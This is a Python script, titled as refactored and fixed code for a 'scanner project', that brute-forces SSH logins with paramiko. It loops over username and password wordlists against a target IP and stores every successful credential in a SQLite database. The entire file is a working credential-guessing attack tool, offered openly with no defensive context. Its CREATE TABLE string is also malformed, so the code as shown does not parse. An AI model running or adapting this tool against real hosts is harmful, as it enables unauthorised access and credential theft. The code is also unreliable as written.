# Refactored and Fixed Code for the Scanner Project

import paramiko
import logging
import sqlite3

def load_wordlists():
    """Load username and password lists for brute force attacks."""
    try:
        with open("wordlists/ssh_usernames.txt", "r") as f:
            usernames = f.read().splitlines()
        with open("wordlists/ssh_passwords.txt", "r") as f:
            passwords = f.read().splitlines()
        return usernames, passwords
    except FileNotFoundError as e:
        logging.error(f"Wordlist file not found: {e}")
        return [], []

def attempt_login(ip, username, password, port=22):
    """Attempt SSH login with the given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, port=port, timeout=5)
        logging.info(f"Login successful: {username}@{ip}:{port}")
        store_successful_login(ip, username, password, port)
        return True
    except paramiko.AuthenticationException:
        logging.warning(f"Failed login: {username}@{ip}")
        return False
    except Exception as e:
        logging.error(f"Error attempting login on {ip}: {e}")
        return False
    finally:
        client.close()

def store_successful_login(ip, username, password, port):
    """Store successful login credentials in a database."""
    conn = sqlite3.connect("logins.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS successful_logins (
            ip TEXT,
            username TEXT,
            password TEXT,
            port INTEGER
        )
    ""
    )
    cursor.execute("INSERT INTO successful_logins (ip, username, password, port) VALUES (?, ?, ?, ?)",
                   (ip, username, password, port))
    conn.commit()
    conn.close()

def bruteforce_ssh(ip, port=22):
    """Perform an SSH brute-force attack on the given IP."""
    usernames, passwords = load_wordlists()
    if not usernames or not passwords:
        logging.error("No wordlists loaded. Cannot proceed with brute-force attack.")
        return False

    for username in usernames:
        for password in passwords:
            if attempt_login(ip, username, password, port):
                return username, password
    
    logging.info(f"Brute-force attack failed on {ip}:{port}")
    return None
